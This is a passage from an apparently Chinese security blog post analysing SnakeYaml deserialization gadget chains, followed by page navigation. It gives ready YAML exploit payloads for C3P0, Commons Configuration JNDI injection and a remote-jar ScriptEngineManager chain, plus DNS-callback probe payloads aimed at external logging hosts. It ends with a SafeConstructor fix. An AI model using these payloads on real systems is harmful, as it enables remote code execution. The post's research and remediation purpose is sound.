class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;  jndiName: \&quot;rmi://localhost/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;  loginTimeout: 0&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><ul>
<li>同样也是 C3P0 的一条链子，关于 C3P0 的链子可以看我这篇文章</li>
</ul>
<p><a href="https://drun1baby.github.io/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/">Java反序列化之C3P0链</a></p>
<p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +  </span><br><span class="line"><span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>二次反序列化的 payload</p>
<h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>依赖包</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/Exploit\&quot;]]: 1&quot;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这条链子是参考 Y4tacker 师傅写的，我个人觉得这条链子是由一些问题的</p>
</blockquote>
<p>主要是触发的时候是利用 key 调用 <code>hashCode()</code> 方法所产生的利用链，还是简单说下调用链吧</p>
<p>在对 <code>ConfigurationMap</code> 调用 <code>hashCode()</code> 的时候实际上是执行了 <code>java.util.AbstractMap#hashCode()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())  </span><br><span class="line">        h += i.next().hashCode();  </span><br><span class="line">    <span class="keyword">return</span> h;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后会调用  <code>org.apache.commons.configuration.ConfigurationMap.ConfigurationSet#iterator()</code></p>
<p>之后就可以配合 <code>JNDIConfiguration</code> 实现 Jndi 注入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)  </span><br><span class="line">getBaseContext:<span class="number">452</span>, JNDIConfiguration (org.apache.commons.configuration)  </span><br><span class="line">getKeys:<span class="number">203</span>, JNDIConfiguration (org.apache.commons.configuration)  </span><br><span class="line">getKeys:<span class="number">182</span>, JNDIConfiguration (org.apache.commons.configuration)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-SnakeYaml-的探测"><a href="#0x05-SnakeYaml-的探测" class="headerlink" title="0x05 SnakeYaml 的探测"></a>0x05 SnakeYaml 的探测</h2><p>这一块内容 RoboTerh 师傅总结的很好</p>
<h3 id="SPI-的探测链子"><a href="#SPI-的探测链子" class="headerlink" title="SPI 的探测链子"></a>SPI 的探测链子</h3><p>这其实用之前的 <code>SPI</code> 机制的链子就可以，我这里就不放了，说一下万一 SPI 机制被 ban 的情况下，如何绕过</p>
<h3 id="使用-Key-调用-hashCode-方法探测"><a href="#使用-Key-调用-hashCode-方法探测" class="headerlink" title="使用 Key 调用 hashCode 方法探测"></a>使用 Key 调用 hashCode 方法探测</h3><p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<p>我们根据urldns链可以知道key会进行hashCode方法的调用，之后进行urldns的解析</p>
<p>SnakeYaml在进行map的处理的时候将会对key进行hashCode处理，所以我们尝试map的格式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    hashMap.put(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">    System.out.println(yaml.dump(hashMap));</span><br><span class="line"><span class="comment">// &#123;a: a, b: b&#125;</span></span><br></pre></td></tr></table></figure>

<p>所以我们就可以按照这种使用<code>&#123; &#125;</code>包裹的形式构造map，然后将指定的URL置于key位置</p>
<h4 id="探测内部类"><a href="#探测内部类" class="headerlink" title="探测内部类"></a>探测内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\&quot;http://tcbua9.ceye.io/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在前面加上需要探测的类，在反序列化的过程中如果没有报错，说明反序列化成功了的，进而存在该类</p>
<p>这里创建对象的时候使用的是<code>&#123;&#125;</code>这种代表的是无参构造，所以需要存在有无参构造函数，不然需要使用<code>[]</code>进行复制构造</p>
<h2 id="0x06-SnakeYaml-漏洞的修复"><a href="#0x06-SnakeYaml-漏洞的修复" class="headerlink" title="0x06 SnakeYaml 漏洞的修复"></a>0x06 SnakeYaml 漏洞的修复</h2><p>SnakeYaml 官方并没有把这一种现象作为漏洞看待，所以它的修复方法是这样的</p>
<p>加入 <code>new SafeConstructor()</code> 类进行过滤，这个类的相关作用在手写 XBean EXP 的时候也遇上过，我们现在把它拿到实战上面来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload-master.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次进行反序列化会抛异常。</p>


<p>再者就是拒绝不安全的反序列化操作，反序列化数据前需要经过校验或拒绝反序列化数据可控。不过这样的修洞就是大修了</p>
<h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><ul>
<li>在这一篇文章里的小结倒是想多说一点哈哈</li>
</ul>
<p>自己算是第一次独立分析反序列化的深层次代码，收获到了很多东西，在其他师傅没有对应的文章讲述逻辑的情况下，自己把代码看懂了，算是给了自己不少的鼓励和信心。</p>
<p>在 XBean EXP 那里一度的理解比较挣扎，好在后面是搞懂了，并且手写了 EXP，从 0 - 0.1 吧，实际上还发现了 NamingManger 这里也是存在安全隐患的，但是没有深入去挖，这里也是让自己 mark 一下，寻找存在的可用 Gadget。</p>
<p>包括在上面的 SafeConstructor 类里面做的过滤手段，返回值是一个 Map 类，和 Fastjson 的 1.2.67 版本提出的利用方式有异曲同工之妙，这里也给自己 mark 一下。</p>
<p>当然，其实 SnakeYaml 本身的利用范围就比较有限，如果我 SnakeYaml 的 Gadget 可用，那么在 Fastjson 当中，这条 Gadget 也一定是可用的。</p>
<h2 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08 参考资料"></a>0x08 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/343387.html" >https://www.freebuf.com/vuls/343387.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90" >https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">Java反序列化之 SnakeYaml 链</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2022-10-16 14:56:52</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2022/10/16/Java反序列化之-SnakeYaml-链/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Java/"><i class="icon fas fa-hashtag"></i>Java</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2022/10/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8705-%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item text-ellipsis">Java反序列化Fastjson篇05-写给自己看的一些源码深入分析</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2022/10/12/Java-%E5%8F%8D%E5%BC%B9-shell-%E4%B8%8E-Runtime-getRuntime-exec-%E7%9A%84%E6%95%85%E4%BA%8B/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item text-ellipsis">Java 反弹 shell 与 Runtime.getRuntime().exec() 的故事</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                


    <div class="comments-container">
        <div id="comments-anchor"></div>
        <div class="comment-area-title">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: '9Ky0YY6Ij33nFC4KZ2VcGh9k-MdYXbMMI',
              appKey: 'qqN77H4k2Hxhg7ZJ88Lf0xxM',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'just go go',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return '博主'
                case 'zh-TW':
                  return '站長'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'Drunkbaby'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>


        
    </div>





            
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE"><span class="nav-text">Java 反序列化之 SnakeYaml 链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Yaml-%E5%9F%BA%E7%A1%80"><span class="nav-text">0x02 Yaml 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Yaml-%E8%AF%AD%E6%B3%95"><span class="nav-text">Yaml 语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SnakeYaml-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">SnakeYaml 序列化与反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="nav-text">一些小坑的探索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SnakeYaml-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-text">SnakeYaml 序列化与反序列化的调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#public-%E7%9A%84-getter-%E6%96%B9%E6%B3%95%E4%B8%8D%E8%83%BD%E8%A2%AB%E8%B0%83%E7%94%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">public 的 getter 方法不能被调用的原因</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B-SPI-%E9%93%BE%E5%AD%90"><span class="nav-text">0x03 SnakeYaml 反序列化漏洞之 SPI 链子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-SPI-%E6%9C%BA%E5%88%B6-%E5%9F%BA%E4%BA%8E-ScriptEngineManager-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">利用 SPI 机制 - 基于 ScriptEngineManager 利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-%E4%B8%8E%E6%94%BB%E5%87%BB"><span class="nav-text">EXP 与攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPI-%E6%9C%BA%E5%88%B6"><span class="nav-text">SPI 机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SnakeYaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84-Gadgets"><span class="nav-text">0x04 SnakeYaml 反序列化漏洞的 Gadgets</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E8%AF%B4-gadgets-%E4%B9%8B%E5%89%8D%E6%9C%89%E4%B8%80%E4%BA%9B%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">在说 gadgets 之前有一些很有必要的基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-PropertyPathFactoryBean"><span class="nav-text">Spring PropertyPathFactoryBean</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-XBean"><span class="nav-text">Apache XBean</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%93%BE%E5%B0%BE"><span class="nav-text">链尾</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E6%9E%84%E9%80%A0%EF%BC%88%E9%87%8D%E8%A6%81%EF%BC%89"><span class="nav-text">EXP 的分析与构造（重要）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C3P0-JndiRefForwardingDataSource"><span class="nav-text">C3P0 JndiRefForwardingDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C3P0-WrapperConnectionPoolDataSource"><span class="nav-text">C3P0 WrapperConnectionPoolDataSource</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Commons-Configuration"><span class="nav-text">Apache Commons Configuration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-SnakeYaml-%E7%9A%84%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x05 SnakeYaml 的探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SPI-%E7%9A%84%E6%8E%A2%E6%B5%8B%E9%93%BE%E5%AD%90"><span class="nav-text">SPI 的探测链子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Key-%E8%B0%83%E7%94%A8-hashCode-%E6%96%B9%E6%B3%95%E6%8E%A2%E6%B5%8B"><span class="nav-text">使用 Key 调用 hashCode 方法探测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E9%83%A8%E7%B1%BB"><span class="nav-text">探测内部类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-SnakeYaml-%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="nav-text">0x06 SnakeYaml 漏洞的修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x07 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x08 参考资料</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2021</span>&nbsp;-&nbsp;2023
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Drunkbaby</a>
                
            </div>

            <div class="theme-info info-item default">
                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.7.3</a>
            </div>

            

            
        

        <div class="count-item info-item default">
            

            
                <span class="count-box border-box uv">
                    <span class="item-type border-box">访问人数</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-box border-box pv">
                    <span class="item-type border-box">总访问量</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="tools-list border-box">
        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-SnakeYaml-%E9%93%BE"><span class="nav-text">Java 反序列化之 SnakeYaml 链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Yaml-%E5%9F%BA%E7%A1%80"><span class="nav-text">0x02 Yaml 基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Yaml-%E8%AF%AD%E6%B3%95"><span class="nav-text">Yaml 语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SnakeYaml-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">SnakeYaml 序列化与反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91%E7%9A%84%E6%8E%A2%E7%B4%A2"><span class="nav-text">一些小坑的探索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SnakeYaml-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-text">SnakeYaml 序列化与反序列化的调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 